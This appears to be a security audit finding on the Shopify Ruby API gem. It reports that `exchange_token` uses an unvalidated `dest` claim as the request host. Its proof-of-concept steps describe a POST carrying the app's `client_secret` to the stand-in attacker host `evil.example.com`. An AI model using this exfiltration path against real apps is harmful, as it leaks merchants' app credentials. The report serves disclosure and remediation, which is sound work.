## Finding: Missing Shop-Domain Validation in `TokenExchange.exchange_token` Leaks `client_secret` to Attacker-Controlled Host

### Title
Unsanitized `dest` claim used to construct OAuth token-exchange request host, allowing `client_secret` exfiltration to an attacker-controlled domain - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` takes the shop hostname directly from the session token's `dest` claim and uses it, unsanitized, to build the HTTP host that receives the POST request carrying the app's `client_secret`. Unlike its sibling method `migrate_to_expiring_token` in the same file, which explicitly calls `Utils::ShopValidator.sanitize!` to restrict the host to Shopify's trusted domain list before using it, `exchange_token` skips this check entirely.

### Finding Description
In `exchange_token`: [1](#0-0) 

`jwt_payload.shop` merely strips the `"https://"` prefix from the raw `dest` claim with no further validation: [2](#0-1) 

This `dest_shop` value is used to build `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)`, which `Clients::HttpClient` turns directly into the request host with no allow-listing: [3](#0-2) 

The POST body sent to that host includes the app's `client_secret` and the `subject_token` (the session token itself): [4](#0-3) 

By contrast, `migrate_to_expiring_token` in the very same module explicitly validates the shop against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) before it is used to construct a session/host: [5](#0-4) [6](#0-5) 

The binding that is broken: **host validated (`ShopValidator.sanitize!` allow-listing) ≠ host that actually receives the `client_secret`** in `exchange_token`. Shopify's own docs (referenced in `docs/usage/oauth.md`) note that "its `dest` claim determines which shop receives the token exchange request," confirming that `dest` is treated as the trusted destination without any independent domain check inside this gem.

### Impact Explanation
A shop with a custom domain mapped through Shopify (a routine, unprivileged merchant/dev-store action requiring no elevated access) can cause the app's embedded session token to carry a `dest` value equal to that custom domain rather than the canonical `*.myshopify.com` host. When the host application calls `exchange_token`, this library will POST the app's `client_id`, `client_secret`, and the raw session token (`subject_token`) directly to that attacker-influenced host instead of to a verified Shopify domain — SSRF that exfiltrates the app's `client_secret`, matching the High-impact "SSRF with the app's credentials" category.

### Likelihood Explanation
The only precondition is control over a domain that Shopify will reflect back in the `dest` claim (e.g., a custom domain on the merchant's own store) — no theft of secrets, tokens, or privileged access is required, and the code path (`exchange_token`) is the primary, documented, recommended OAuth flow for embedded apps. The presence of a working sanitize call in the neighboring `migrate_to_expiring_token` method for the exact same class of value confirms the maintainers recognize the need for this check, making its absence here a clear regression/oversight rather than an intentional design choice.

### Recommendation
Validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `migrate_to_expiring_token`) before constructing `shop_session` in `exchange_token`, raising `Errors::InvalidShopError` if the host is not on `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Attacker/merchant configures a custom domain (e.g. `evil.example.com`) on a Shopify dev/trial store they control, pointing it at infrastructure they control.
2. The store's embedded app session token is issued by Shopify with `dest: "https://evil.example.com"` (or an equivalent host reflecting the custom domain) rather than `*.myshopify.com`.
3. The host application calls `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: <token>, requested_token_type: ...)`.
4. `exchange_token` sets `dest_shop = jwt_payload.shop` = `"evil.example.com"` with no sanitization, and `Clients::HttpClient` builds `@base_uri = "https://evil.example.com"`.
5. The library issues `POST https://evil.example.com/admin/oauth/access_token` with a JSON body containing `client_id`, `client_secret`, and `subject_token` — delivering the app's `client_secret` to the attacker's server.

### Citations

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```
